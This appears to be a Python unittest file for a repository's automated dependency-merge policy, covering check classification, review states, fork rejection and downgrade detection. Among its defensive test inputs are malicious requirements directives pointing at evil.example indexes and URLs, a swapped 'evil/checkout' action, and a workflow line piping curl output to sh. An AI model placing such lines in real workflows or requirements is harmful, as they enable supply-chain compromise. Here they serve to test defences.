"""Offline maintenance policy tests — no GitHub writes, no posting."""
from __future__ import annotations

import json
import sys
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
SCRIPTS = ROOT / ".github" / "scripts"
if str(SCRIPTS) not in sys.path:
    sys.path.insert(0, str(SCRIPTS))

import maintenance  # noqa: E402
import python_version_bump  # noqa: E402

SHA = "a" * 40
SHA2 = "b" * 40


REPO = "uesu/News-Express"


def _pr(*, login="dependabot[bot]", sha=SHA, ref="dependabot/pip/foo", draft=False,
        labels=None, mergeable=True, mergeable_state="clean", base="main",
        head_repo=REPO, base_repo=REPO):
    # Real GitHub PR payloads always carry head.repo and base.repo. Omitting them
    # let every fixture skip the same-repository association check entirely.
    head = {"sha": sha, "ref": ref}
    if head_repo is not None:
        head["repo"] = {"full_name": head_repo, "default_branch": "main"}
    base_obj = {"ref": base}
    if base_repo is not None:
        base_obj["repo"] = {"full_name": base_repo, "default_branch": "main"}
    return {
        "number": 12,
        "state": "open",
        "draft": draft,
        "html_url": "https://example.test/pr/12",
        "mergeable": mergeable,
        "mergeable_state": mergeable_state,
        "user": {"login": login},
        "head": head,
        "base": base_obj,
        "labels": labels or [],
    }


def _snapshot(**overrides):
    data = {
        "repository": "uesu/News-Express",
        "head_sha": SHA,
        "pull_request": _pr(),
        "checks": [{
            "id": 1, "name": "application", "head_sha": SHA, "status": "completed",
            "conclusion": "success", "app": {"slug": "github-actions"},
        }],
        "files": [{"filename": "requirements.txt", "patch": "-aiohttp==3.14.4\n+aiohttp==3.14.5\n"}],
        "reviews": [],
        "legacy_statuses": [],
        "risk": {"risk": "routine", "auto_eligible": True, "reason": "package-patch-or-minor"},
        "variables": {"AUTO_MERGE_DEPENDABOT": "yes", "AUTO_MERGE_PYTHON_BUMP": "yes"},
        "policy": {
            "repository": "uesu/News-Express",
            "default_branch": "main",
            "mandatory_check_names": ["application"],
            "human_review_labels": ["review-required", "do-not-merge", "hold"],
            "updater_identities": {
                "dependabot": {"login": "dependabot[bot]", "auto_merge_var": "AUTO_MERGE_DEPENDABOT"},
                "python_bump": {
                    "login": "github-actions[bot]",
                    "auto_merge_var": "AUTO_MERGE_PYTHON_BUMP",
                    "branch_prefix": "chore/python-",
                    "allowed_files": [".python-version"],
                },
            },
            "allowed_merge_method": "squash",
            "dependabot_allowed_files": [
                "requirements.in",
                "requirements.txt",
                "requirements-dev.in",
                "requirements-dev.txt",
                ".github/workflows/",
            ],
        },
    }
    data.update(overrides)
    return data


class VersionAndSelectTests(unittest.TestCase):
    def test_patch_is_auto_eligible(self):
        current = maintenance.parse_version("3.14.8")
        manifest = [{
            "version": "3.14.9",
            "stable": True,
            "release_url": "https://example.test/3.14.9",
            "files": [{"platform": "linux", "arch": "x64"}],
        }]
        result = maintenance.select_python_candidate(current, manifest)
        self.assertEqual(result["status"], "proposed")
        self.assertEqual(result["kind"], "patch")
        self.assertTrue(result["auto_eligible"])

    def test_next_minor_needs_review_after_soak(self):
        current = maintenance.parse_version("3.14.8")
        manifest = [{
            "version": "3.15.0",
            "stable": True,
            "release_date": "2026-01-01T00:00:00Z",
            "files": [{"platform": "linux", "arch": "x64"}],
        }]
        result = maintenance.select_python_candidate(
            current, manifest, soak_days=30,
            now=maintenance.parse_iso_date("2026-03-01T00:00:00Z"),
        )
        self.assertEqual(result["status"], "review-required")
        self.assertEqual(result["kind"], "minor")
        self.assertFalse(result["auto_eligible"])

    def test_minor_inside_soak_is_deferred(self):
        current = maintenance.parse_version("3.14.8")
        manifest = [{
            "version": "3.15.0",
            "stable": True,
            "release_date": "2026-09-20T00:00:00Z",
            "files": [{"platform": "linux", "arch": "x64"}],
        }]
        result = maintenance.select_python_candidate(
            current, manifest, soak_days=30,
            now=maintenance.parse_iso_date("2026-09-25T00:00:00Z"),
        )
        self.assertEqual(result["status"], "deferred")
        self.assertIn("soak", result["reason"])

    def test_skip_minor_and_major_are_not_auto(self):
        current = maintenance.parse_version("3.14.8")
        forced = maintenance.select_python_candidate(current, [], force="3.16.0")
        self.assertEqual(forced["status"], "review-required")
        major = maintenance.select_python_candidate(current, [], force="4.0.0")
        self.assertEqual(major["status"], "review-required")
        self.assertFalse(major["auto_eligible"])

    def test_prerelease_manifest_entries_are_ignored(self):
        current = maintenance.parse_version("3.14.8")
        manifest = [{
            "version": "3.14.9rc1",
            "stable": True,
            "files": [{"platform": "linux", "arch": "x64"}],
        }]
        result = maintenance.select_python_candidate(current, manifest)
        self.assertEqual(result["status"], "up-to-date")

    def test_package_and_action_classification(self):
        self.assertEqual(maintenance.classify_package_update("1.2.3", "1.2.4")["risk"], "routine")
        self.assertEqual(maintenance.classify_package_update("1.2.3", "2.0.0")["risk"], "review-required")
        self.assertEqual(maintenance.classify_package_update("0.4.0", "0.5.0")["risk"], "review-required")
        self.assertEqual(
            maintenance.classify_action_update(SHA, SHA2, old_action="actions/checkout",
                                               new_action="actions/checkout",
                                               comment_old="v7", comment_new="v7")["risk"],
            "routine",
        )
        self.assertEqual(
            maintenance.classify_action_update(SHA, SHA2, old_action="actions/checkout",
                                               new_action="actions/checkout",
                                               comment_old="v7", comment_new="v8")["risk"],
            "review-required",
        )
        grouped = maintenance.highest_risk([
            {"risk": "routine", "auto_eligible": True},
            {"risk": "review-required", "auto_eligible": False},
        ])
        self.assertEqual(grouped["risk"], "review-required")
        self.assertFalse(grouped["auto_eligible"])


class CheckClassificationTests(unittest.TestCase):
    def test_zero_checks_fail(self):
        result = maintenance.classify_checks(
            [], expected_names=["application"], head_sha=SHA)
        self.assertEqual(result["state"], "failed")

    def test_skipped_neutral_cancelled_do_not_count(self):
        for conclusion in ("skipped", "neutral", "cancelled", "failure"):
            result = maintenance.classify_checks(
                [{"id": 1, "name": "application", "head_sha": SHA, "status": "completed",
                  "conclusion": conclusion, "app": {"slug": "github-actions"}}],
                expected_names=["application"], head_sha=SHA)
            self.assertEqual(result["state"], "failed", conclusion)

    def test_pending_stays_pending(self):
        result = maintenance.classify_checks(
            [{"id": 1, "name": "application", "head_sha": SHA, "status": "in_progress",
              "app": {"slug": "github-actions"}}],
            expected_names=["application"], head_sha=SHA)
        self.assertEqual(result["state"], "pending")

    def test_unrelated_and_foreign_ignored_or_rejected(self):
        result = maintenance.classify_checks(
            [{"id": 1, "name": "unrelated", "head_sha": SHA, "status": "completed",
              "conclusion": "success", "app": {"slug": "github-actions"}}],
            expected_names=["application"], head_sha=SHA)
        self.assertEqual(result["state"], "failed")
        foreign = maintenance.classify_checks(
            [{"id": 1, "name": "application", "head_sha": SHA, "status": "completed",
              "conclusion": "success", "app": {"slug": "not-github"}}],
            expected_names=["application"], head_sha=SHA)
        self.assertEqual(foreign["state"], "failed")
        self.assertIn("untrusted-app", foreign["reason"])

    def test_stale_sha_is_ignored(self):
        result = maintenance.classify_checks(
            [{"id": 1, "name": "application", "head_sha": SHA2, "status": "completed",
              "conclusion": "success", "app": {"slug": "github-actions"}}],
            expected_names=["application"], head_sha=SHA)
        self.assertEqual(result["state"], "failed")

    def test_latest_id_wins(self):
        result = maintenance.classify_checks(
            [
                {"id": 1, "name": "application", "head_sha": SHA, "status": "completed",
                 "conclusion": "failure", "app": {"slug": "github-actions"}},
                {"id": 9, "name": "application", "head_sha": SHA, "status": "completed",
                 "conclusion": "success", "app": {"slug": "github-actions"}},
            ],
            expected_names=["application"], head_sha=SHA)
        self.assertEqual(result["state"], "ready")


class MergeDecisionTests(unittest.TestCase):
    def test_happy_path_merges(self):
        decision = maintenance.decide_merge(_snapshot())
        self.assertEqual(decision.action, "merge")
        self.assertEqual(decision.merge_method, "squash")

    def test_missing_field_fails_closed(self):
        snap = _snapshot()
        del snap["checks"]
        decision = maintenance.decide_merge(snap)
        self.assertEqual(decision.action, "fail")
        self.assertIn("missing-field", decision.reason)

    def test_hold_label_and_changes_requested(self):
        hold = maintenance.decide_merge(_snapshot(pull_request=_pr(labels=[{"name": "hold"}])))
        self.assertEqual(hold.action, "defer")
        changes = maintenance.decide_merge(_snapshot(reviews=[{"state": "CHANGES_REQUESTED"}]))
        self.assertEqual(changes.action, "defer")

    def test_untrusted_updater_and_head_change(self):
        human = maintenance.decide_merge(_snapshot(pull_request=_pr(login="alice")))
        self.assertEqual(human.action, "defer")
        moved = maintenance.decide_merge(_snapshot(head_sha=SHA2))
        self.assertEqual(moved.action, "fail")

    def test_auto_merge_flag_must_be_exact_yes(self):
        for value in ("Yes", "true", "1", "on", ""):
            decision = maintenance.decide_merge(_snapshot(variables={"AUTO_MERGE_DEPENDABOT": value}))
            self.assertEqual(decision.action, "defer", value)

    def test_python_bump_rejects_extra_paths(self):
        pr = _pr(login="github-actions[bot]", ref="chore/python-3.14.9")
        snap = _snapshot(
            pull_request=pr,
            files=[{"filename": ".python-version", "patch": "-3.14.8\n+3.14.9\n"},
                   {"filename": "README.md", "patch": "+x\n"}],
            variables={"AUTO_MERGE_PYTHON_BUMP": "yes"},
            risk={"risk": "routine", "auto_eligible": True},
        )
        decision = maintenance.decide_merge(snap)
        self.assertEqual(decision.action, "review-required")

    def test_workflow_policy_change_is_not_routine(self):
        files = [{
            "filename": ".github/workflows/ci.yml",
            "patch": "+      timeout-minutes: 99\n",
        }]
        snap = _snapshot(files=files)
        decision = maintenance.decide_merge(snap)
        self.assertNotEqual(decision.action, "merge")

    def test_fixture_cli_refuses_live_fallback(self):
        with self.assertRaises(SystemExit):
            maintenance.main(["decide"])
        with tempfile.TemporaryDirectory() as tmp:
            fixture = Path(tmp) / "snap.json"
            fixture.write_text("{}\n", encoding="utf-8")
            self.assertEqual(maintenance.main(["decide", "--fixture", str(fixture)]), 1)
            self.assertEqual(
                maintenance.main(["decide", "--fixture", str(fixture), "--apply"]), 2)


class PythonBumpAdapterTests(unittest.TestCase):
    def test_write_pin_rewrites_only_the_pin_file(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            pin = root / ".python-version"
            pin.write_text("3.14.8\n", encoding="utf-8")
            extra = root / "README.md"
            extra.write_text("stay\n", encoding="utf-8")
            profile = ROOT / ".github" / "maintenance.json"
            code = python_version_bump.main([
                "--write-pin", "--candidate", "3.14.9",
                "--root", str(root), "--profile", str(profile),
            ])
            self.assertEqual(code, 0)
            self.assertEqual(pin.read_text(encoding="utf-8"), "3.14.9\n")
            self.assertEqual(extra.read_text(encoding="utf-8"), "stay\n")

    def test_missing_docs_are_ok_for_selection(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / ".python-version").write_text("3.14.8\n", encoding="utf-8")
            fixture = Path(tmp) / "fix.json"
            fixture.write_text(json.dumps({
                "current": "3.14.8",
                "manifest": [{
                    "version": "3.14.8",
                    "stable": True,
                    "files": [{"platform": "linux", "arch": "x64"}],
                }],
            }), encoding="utf-8")
            code = python_version_bump.main([
                "--fixture", str(fixture),
                "--root", str(root),
                "--profile", str(ROOT / ".github" / "maintenance.json"),
            ])
            self.assertEqual(code, 0)

    def test_live_without_fixture_or_manifest_refuses(self):
        self.assertEqual(python_version_bump.main([]), 2)


class CiRegistryTests(unittest.TestCase):
    def test_unregistered_test_file_is_rejected(self):
        import ci as ci_mod
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            tests = root / "tests"
            tests.mkdir()
            (tests / "test_orphan.py").write_text("print(1)\n", encoding="utf-8")
            profile = {"test_commands": {"application": [["python", "tests/test_smoke.py"]]}}
            with self.assertRaises(SystemExit) as caught:
                ci_mod.ensure_all_tests_registered(root, profile)
            self.assertIn("unregistered", str(caught.exception))

    def test_final_gate_fail_closed(self):
        import ci as ci_mod
        self.assertEqual(ci_mod.final_gate({"application": 0, "maintenance": 1}), 1)
        self.assertEqual(ci_mod.final_gate({"application": 0, "maintenance": 0}), 0)


class GroupedUpdateRiskTests(unittest.TestCase):
    """Every package in a grouped diff must be classified, not just the last."""

    MAJOR_THEN_PATCH = (
        "-aiohttp==3.14.5 \\\n+aiohttp==4.0.0 \\\n"
        "     --hash=sha256:aa\n"
        "-idna==3.19 \\\n+idna==3.20 \\\n"
    )
    PATCH_THEN_MAJOR = (
        "-idna==3.19 \\\n+idna==3.20 \\\n"
        "-aiohttp==3.14.5 \\\n+aiohttp==4.0.0 \\\n"
    )

    def _risk(self, patch):
        return maintenance.snapshot_risk_from_files(
            [{"filename": "requirements.txt", "patch": patch}], None
        )

    def test_grouped_major_is_not_hidden_by_a_later_patch(self):
        # Regression: the parser kept only the final old/new pair per file, so the
        # aiohttp major was overwritten by the idna patch and the PR read routine.
        for label, patch in (("major-first", self.MAJOR_THEN_PATCH),
                             ("patch-first", self.PATCH_THEN_MAJOR)):
            with self.subTest(order=label):
                risk = self._risk(patch)
                self.assertEqual(risk["risk"], "review-required")
                self.assertFalse(risk["auto_eligible"])
                self.assertEqual(risk["members"], 2)
                self.assertEqual(risk["name"], "aiohttp")

    def test_every_package_is_counted(self):
        patch = ("-a==1.0.0\n+a==1.0.1\n-b==2.0.0\n+b==2.0.1\n-c==3.0.0\n+c==3.0.1\n")
        self.assertEqual(self._risk(patch)["members"], 3)

    def test_added_and_removed_packages_require_review(self):
        for label, patch, reason in (
            ("added", "+six==1.0.0 \\", "package-added"),
            ("removed", "-six==1.0.0 \\", "package-removed"),
        ):
            with self.subTest(case=label):
                risk = self._risk(patch)
                self.assertEqual(risk["risk"], "review-required")
                self.assertFalse(risk["auto_eligible"])
                self.assertEqual(risk["reason"], reason)

    def test_unparseable_patch_requires_review(self):
        risk = self._risk("     --hash=sha256:deadbeef\n")
        self.assertEqual(risk["risk"], "review-required")
        self.assertEqual(risk["reason"], "requirements-patch-unparsed")

    def test_a_plain_patch_update_stays_routine(self):
        risk = self._risk("-aiohttp==3.14.5 \\\n+aiohttp==3.14.6 \\\n")
        self.assertEqual(risk["risk"], "routine")
        self.assertTrue(risk["auto_eligible"])


class RepositoryAssociationTests(unittest.TestCase):
    """Branch and base ref alone are not provenance."""

    def test_fork_head_is_rejected(self):
        snap = _snapshot(pull_request=_pr(head_repo="attacker/fork"))
        decision = maintenance.decide_merge(snap)
        self.assertEqual(decision.action, "fail")
        self.assertEqual(decision.reason, "cross-fork-head")

    def test_foreign_base_repository_is_rejected(self):
        snap = _snapshot(pull_request=_pr(base_repo="other/repo"))
        decision = maintenance.decide_merge(snap)
        self.assertEqual(decision.action, "fail")
        self.assertEqual(decision.reason, "foreign-base-repository")

    def test_missing_association_fails_closed(self):
        for label, kwargs in (("head", {"head_repo": None}), ("base", {"base_repo": None})):
            with self.subTest(missing=label):
                decision = maintenance.decide_merge(_snapshot(pull_request=_pr(**kwargs)))
                self.assertEqual(decision.action, "fail")
                self.assertEqual(decision.reason, "missing-repo-association")

    def test_same_repository_still_merges(self):
        self.assertEqual(maintenance.decide_merge(_snapshot()).action, "merge")


def _review(login, state, when, rid):
    return {"user": {"login": login}, "state": state, "submitted_at": when, "id": rid}


class RequirementsDirectiveTests(unittest.TestCase):
    """A safe version pair must not conceal a change to where packages come from."""

    def _risk(self, patch):
        return maintenance.snapshot_risk_from_files(
            [{"filename": "requirements.txt", "patch": patch}], None
        )

    SAFE = "-aiohttp==3.14.5 \\\n+aiohttp==3.14.6 \\\n"

    def test_directive_alongside_a_safe_patch_requires_review(self):
        # Regression: only the paired version lines were inspected, so an index
        # redirect rode along inside an otherwise routine patch.
        directive = "+--extra-index-url https://untrusted.example/simple\n"
        for label, patch in (
            ("directive after the patch", self.SAFE + directive),
            ("directive before the patch", directive + self.SAFE),
        ):
            with self.subTest(position=label):
                risk = self._risk(patch)
                self.assertEqual(risk["risk"], "review-required")
                self.assertFalse(risk["auto_eligible"])

    def test_every_unsafe_directive_is_rejected(self):
        cases = {
            "extra-index-url": "+--extra-index-url https://evil.example/simple\n",
            "index-url": "+--index-url https://evil.example/simple\n",
            "trusted-host": "+--trusted-host evil.example\n",
            "constraint": "+-c /tmp/evil.txt\n",
            "find-links": "+-f https://evil.example/\n",
            "vcs url": "+aiohttp @ git+https://evil.example/x.git\n",
            "direct url": "+aiohttp @ https://evil.example/a.whl\n",
        }
        for label, line in cases.items():
            with self.subTest(directive=label):
                risk = self._risk(self.SAFE + line)
                self.assertEqual(risk["risk"], "review-required", label)

    def test_marker_on_an_otherwise_normal_version_line(self):
        risk = self._risk('-aiohttp==3.14.5\n+aiohttp==3.14.5 ; python_version < "3.9"\n')
        self.assertEqual(risk["risk"], "review-required")
        self.assertEqual(risk["reason"], "requirements-environment-marker")

    def test_unrecognised_changed_content_is_not_routine(self):
        risk = self._risk("-aiohttp==3.14.5\n+aiohttp==3.14.6\n+something nobody expected\n")
        self.assertEqual(risk["risk"], "review-required")
        self.assertEqual(risk["reason"], "requirements-unrecognised-change")

    def test_plain_patches_stay_routine(self):
        for label, patch in (
            ("single", self.SAFE),
            ("multiple", "-a==1.0.0\n+a==1.0.1\n-b==2.0.0\n+b==2.0.1\n"),
        ):
            with self.subTest(case=label):
                self.assertEqual(self._risk(patch)["risk"], "routine")


class ForcedVersionVerificationTests(unittest.TestCase):
    """A well-formed version string is not proof the release exists."""

    MANIFEST = [{"version": "3.14.9", "stable": True,
                 "files": [{"arch": "x64", "platform": "linux", "platform_version": "22.04"}]}]

    def test_unknown_forced_version_is_not_proposed(self):
        # Regression: 3.14.999 parsed cleanly, so it was proposed as a patch with
        # auto_eligible True despite existing in no manifest.
        for label, manifest in (("empty", {}), ("populated", self.MANIFEST)):
            with self.subTest(manifest=label):
                result = maintenance.select_python_candidate(
                    maintenance.parse_version("3.14.8"),
                    manifest if isinstance(manifest, list) else [],
                    force="3.14.999",
                )
                self.assertEqual(result["status"], "review-required")
                self.assertEqual(result["reason"], "forced-unverified-in-manifest")
                self.assertFalse(result["auto_eligible"])

    def test_forced_version_present_in_the_manifest_is_proposed(self):
        result = maintenance.select_python_candidate(
            maintenance.parse_version("3.14.8"), self.MANIFEST, force="3.14.9"
        )
        self.assertEqual(result["status"], "proposed")
        self.assertTrue(result["auto_eligible"])


class EffectiveReviewTests(unittest.TestCase):
    """Latest decision per reviewer, not any historical change request."""

    PR = {"state": "open", "draft": False, "labels": []}

    def test_a_comment_does_not_erase_an_open_change_request(self):
        # Regression: the newest state of any kind won, so a later COMMENTED
        # replaced CHANGES_REQUESTED and the hold disappeared.
        for state in ("COMMENTED", "PENDING"):
            with self.subTest(state=state):
                reviews = [_review("a", "CHANGES_REQUESTED", "2026-01-01T00:00:00Z", 1),
                           _review("a", state, "2026-02-01T00:00:00Z", 2)]
                self.assertIsNotNone(maintenance.review_blocks(self.PR, reviews, ["hold"]))

    def test_a_comment_between_request_and_approval_does_not_block(self):
        reviews = [_review("a", "CHANGES_REQUESTED", "2026-01-01T00:00:00Z", 1),
                   _review("a", "COMMENTED", "2026-02-01T00:00:00Z", 2),
                   _review("a", "APPROVED", "2026-03-01T00:00:00Z", 3)]
        self.assertIsNone(maintenance.review_blocks(self.PR, reviews, ["hold"]))

    def test_later_approval_clears_an_old_change_request(self):
        reviews = [_review("a", "CHANGES_REQUESTED", "2026-01-01T00:00:00Z", 1),
                   _review("a", "APPROVED", "2026-02-01T00:00:00Z", 2)]
        self.assertIsNone(maintenance.review_blocks(self.PR, reviews, ["hold"]))

    def test_a_still_current_change_request_blocks(self):
        for label, reviews in (
            ("only", [_review("a", "CHANGES_REQUESTED", "2026-01-01T00:00:00Z", 1)]),
            ("approval came first", [_review("a", "APPROVED", "2026-01-01T00:00:00Z", 1),
                                     _review("a", "CHANGES_REQUESTED", "2026-02-01T00:00:00Z", 2)]),
            ("another reviewer", [_review("a", "APPROVED", "2026-02-01T00:00:00Z", 2),
                                  _review("b", "CHANGES_REQUESTED", "2026-01-01T00:00:00Z", 1)]),
        ):
            with self.subTest(case=label):
                self.assertIsNotNone(maintenance.review_blocks(self.PR, reviews, ["hold"]))

    def test_dismissal_clears_the_request(self):
        reviews = [_review("a", "CHANGES_REQUESTED", "2026-01-01T00:00:00Z", 1),
                   _review("a", "DISMISSED", "2026-02-01T00:00:00Z", 2)]
        self.assertIsNone(maintenance.review_blocks(self.PR, reviews, ["hold"]))

    def test_equal_timestamps_resolve_by_id(self):
        reviews = [_review("a", "APPROVED", "2026-01-01T00:00:00Z", 1),
                   _review("a", "CHANGES_REQUESTED", "2026-01-01T00:00:00Z", 2)]
        self.assertIsNotNone(maintenance.review_blocks(self.PR, reviews, ["hold"]))


class DowngradeTests(unittest.TestCase):
    """A step backwards is not a patch."""

    def test_forced_python_downgrade_is_not_auto_eligible(self):
        # Regression: 3.14.8 -> 3.14.7 classified as "patch" and came back
        # proposed / auto_eligible True with an empty manifest.
        result = maintenance.select_python_candidate(
            maintenance.parse_version("3.14.8"), {}, force="3.14.7"
        )
        self.assertEqual(result["status"], "review-required")
        self.assertEqual(result["reason"], "override-downgrade")
        self.assertFalse(result["auto_eligible"])

    def test_forced_patch_upgrade_still_proposes(self):
        # The candidate must exist in the manifest; see
        # ForcedVersionVerificationTests for the unverified case.
        manifest = [{"version": "3.14.9", "stable": True,
                     "files": [{"arch": "x64", "platform": "linux",
                                "platform_version": "22.04"}]}]
        result = maintenance.select_python_candidate(
            maintenance.parse_version("3.14.8"), manifest, force="3.14.9"
        )
        self.assertEqual(result["status"], "proposed")
        self.assertTrue(result["auto_eligible"])

    def test_package_downgrade_requires_review(self):
        for old, new in (("3.19", "3.18"), ("3.14.6", "3.14.5"), ("2.0.0", "1.9.9")):
            with self.subTest(change=f"{old}->{new}"):
                result = maintenance.classify_package_update(old, new, name="idna")
                self.assertEqual(result["risk"], "review-required")
                self.assertFalse(result["auto_eligible"])

    def test_package_upgrade_is_unaffected(self):
        self.assertEqual(
            maintenance.classify_package_update("3.19", "3.20", name="idna")["risk"], "routine"
        )


class TrustedAllowlistTests(unittest.TestCase):
    """The allowlist must come from policy, never from the diff itself."""

    def test_absent_allowlist_requires_review(self):
        snap = _snapshot()
        snap["policy"].pop("dependabot_allowed_files", None)
        snap.pop("trusted_allowed_files", None)
        snap["allowed_files"] = []
        decision = maintenance.decide_merge(snap)
        self.assertEqual(decision.action, "review-required")
        self.assertEqual(decision.reason, "no-trusted-allowlist")

    def test_path_outside_the_allowlist_is_rejected(self):
        snap = _snapshot(files=[{"filename": ".github/scripts/maintenance.py", "patch": "+x = 1\n"}])
        decision = maintenance.decide_merge(snap)
        self.assertNotEqual(decision.action, "merge")

    def test_workflow_directory_prefix_is_allowed_by_policy(self):
        self.assertTrue(maintenance._path_allowed(".github/workflows/ci.yml", {".github/workflows/"}))
        self.assertFalse(maintenance._path_allowed(".github/secret.yml", {".github/workflows/"}))


class WorkflowActionClassificationTests(unittest.TestCase):
    """A workflow filename is not proof that only a safe pin line changed."""

    FILE = ".github/workflows/ci.yml"

    def _risk(self, patch):
        return maintenance.snapshot_risk_from_files([{"filename": self.FILE, "patch": patch}], None)

    def test_same_source_pin_bump_is_routine(self):
        patch = f"-uses: actions/checkout@{SHA}  # v7\n+uses: actions/checkout@{SHA2}  # v7\n"
        risk = self._risk(patch)
        self.assertEqual(risk["risk"], "routine")
        self.assertTrue(risk["auto_eligible"])

    def test_every_unsafe_action_transition_requires_review(self):
        cases = {
            "major bump": f"-uses: actions/checkout@{SHA}  # v7\n+uses: actions/checkout@{SHA2}  # v8\n",
            "source change": f"-uses: actions/checkout@{SHA}  # v7\n+uses: evil/checkout@{SHA2}  # v7\n",
            "floating ref": f"-uses: actions/checkout@{SHA}  # v7\n+uses: actions/checkout@v8\n",
            "action removed": f"-uses: actions/checkout@{SHA}  # v7\n",
            "action added": f"+uses: actions/checkout@{SHA}  # v7\n",
            "no uses line at all": "-        run: echo hi\n+        run: curl http://x | sh\n",
        }
        for label, patch in cases.items():
            with self.subTest(case=label):
                risk = self._risk(patch)
                self.assertEqual(risk["risk"], "review-required", label)
                self.assertFalse(risk["auto_eligible"], label)

    def test_a_command_change_without_policy_keywords_is_not_routine(self):
        # Regression: this used to read as a routine "action-pin" purely because
        # the diff contained no on:/permissions: lines.
        risk = self._risk("-        run: pip install foo\n+        run: pip install foo --upgrade\n")
        self.assertEqual(risk["reason"], "workflow-non-pin-change")


class LiveAdapterEvidenceTests(unittest.TestCase):
    """Drive build_live_snapshot itself, not just decide_merge on ideal JSON.

    A helper-only fixture cannot show that the production adapter fails closed
    when a source of evidence goes missing, which is the failure mode that
    actually merges something it should not.
    """

    EVENT = {
        "repository": {"full_name": "acme/app", "default_branch": "main"},
        "pull_request": {"number": 12, "head": {"sha": SHA}},
    }

    def _run(self, responder):
        original = maintenance._github_json
        maintenance._github_json = responder
        try:
            return maintenance.build_live_snapshot(self.EVENT, "token", {})
        finally:
            maintenance._github_json = original

    @staticmethod
    def _ok(url, *args, **kwargs):
        if "/pulls/12/files" in url:
            return 200, []
        if "/pulls/12/reviews" in url:
            return 200, []
        if "/check-runs" in url:
            return 200, {"check_runs": [], "total_count": 0}
        if url.endswith("/status"):
            return 200, {"state": "success", "statuses": []}
        if url.endswith("/pulls/12"):
            return 200, _pr()
        return 404, {}

    def test_baseline_snapshot_is_built(self):
        result = self._run(self._ok)
        self.assertIsInstance(result, dict, f"expected a snapshot, got {result!r}")

    def test_unreadable_reviews_fail_closed_instead_of_merging(self):
        def responder(url, *a, **k):
            if "/pulls/12/reviews" in url:
                return 500, {}
            return self._ok(url)

        result = self._run(responder)
        # Regression: this used to fall back to reviews = [], which reads as
        # "nobody objected" and would merge straight over a CHANGES_REQUESTED.
        self.assertNotIsInstance(result, dict)
        self.assertEqual(result.action, "fail")
        self.assertIn("reviews-api", result.reason)

    def test_api_pages_refuses_to_walk_past_its_bound(self):
        # Direct assertion on the bound itself. Without it the walk above does
        # not merely fail - it never terminates, so this is the crisp check.
        calls = []

        def responder(url, *args, **kwargs):
            calls.append(url)
            return 200, [{"i": len(calls)} for _ in range(100)]

        original = maintenance._github_json
        maintenance._github_json = responder
        try:
            status, _items = maintenance._api_pages(
                "https://api.example.test/x?per_page=100&page=1", "token", max_pages=3
            )
        finally:
            maintenance._github_json = original
        self.assertEqual(status, 508)
        self.assertEqual(len(calls), 3)

    def test_pagination_bound_fails_closed(self):
        def responder(url, *a, **k):
            if "/pulls/12/files" in url:
                return 200, [{"filename": f"f{i}.txt"} for i in range(100)]
            return self._ok(url)

        result = self._run(responder)
        # Regression: _api_pages had no upper bound, so an endless full page
        # either spun forever or was silently truncated to the first 100 files.
        self.assertNotIsInstance(result, dict)
        self.assertEqual(result.action, "fail")
        self.assertIn("files-api", result.reason)


if __name__ == "__main__":
    unittest.main()
